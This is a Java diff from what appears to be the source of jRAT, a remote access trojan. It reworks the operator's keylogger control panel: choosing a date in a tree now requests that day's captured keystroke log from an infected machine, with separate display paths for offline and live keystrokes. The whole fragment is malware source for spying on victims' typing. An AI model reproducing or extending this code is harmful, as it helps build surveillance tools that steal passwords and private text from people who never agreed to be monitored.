@@ -20,19 +20,18 @@ import javax.swing.JToggleButton;
 import javax.swing.JTree;
 import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.ScrollPaneConstants;
+import javax.swing.event.TreeSelectionEvent;
+import javax.swing.event.TreeSelectionListener;
 import javax.swing.text.Style;
 import javax.swing.text.StyleConstants;
 import javax.swing.tree.DefaultMutableTreeNode;
 import javax.swing.tree.DefaultTreeModel;
-import javax.swing.tree.TreePath;
 
 import pro.jrat.api.BaseControlPanel;
 import pro.jrat.api.PacketBuilder;
 import pro.jrat.api.RATObject;
 import pro.jrat.plugin.client.HeartbeatThread;
 import pro.jrat.plugin.client.KeyloggerPlugin;
-import javax.swing.event.TreeSelectionListener;
-import javax.swing.event.TreeSelectionEvent;
 
 @SuppressWarnings("serial")
 public class PanelKeylogger extends BaseControlPanel {
@@ -116,22 +115,18 @@ public class PanelKeylogger extends BaseControlPanel {
 			public void valueChanged(TreeSelectionEvent event) {
 				Object node = event.getPath().getLastPathComponent();
 
-				if (node instanceof DayTreeNode) {		
-					String path = "";
+				if (node instanceof DayTreeNode) {							
+					final YearTreeNode year = (YearTreeNode)event.getPath().getPath()[1];
+					final MonthTreeNode month = (MonthTreeNode)event.getPath().getPath()[2];
+					final DayTreeNode day = (DayTreeNode)event.getPath().getPath()[3];
 					
-					for (int i = 1; i < event.getPath().getPath().length; i++) {
-						DefaultMutableTreeNode tp = (DefaultMutableTreeNode)event.getPath().getPath()[i];
-						
-						path += "/" + tp.toString();
-					}
-					
-					final String finalPath = path;
-										
 					try {
 						getServer().addToSendQueue(new PacketBuilder(KeyloggerPlugin.LOG_HEADER, getServer()) {
 							@Override
 							public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
-								dos.writeUTF(finalPath);
+								dos.writeUTF(year.toString());
+								dos.writeUTF(month.toString());
+								dos.writeUTF(day.toString());
 							}
 						});
 					} catch (Exception e) {
@@ -170,8 +165,12 @@ public class PanelKeylogger extends BaseControlPanel {
 			offlineTextPane.getStyledDocument().remove(offlineTextPane.getDocument().getLength() - 1, 1);
 		}
 	}
+	
+	public void setOfflineLog(String log) {
+		offlineTextPane.setText(log);
+	}
 
-	public synchronized void append(String key) {
+	public synchronized void appendOnline(String key) {
 		try {
 			if (key.equals("[BACKSPACE]") && chckbxDeleteCharOn.isSelected()) {
 				delete();
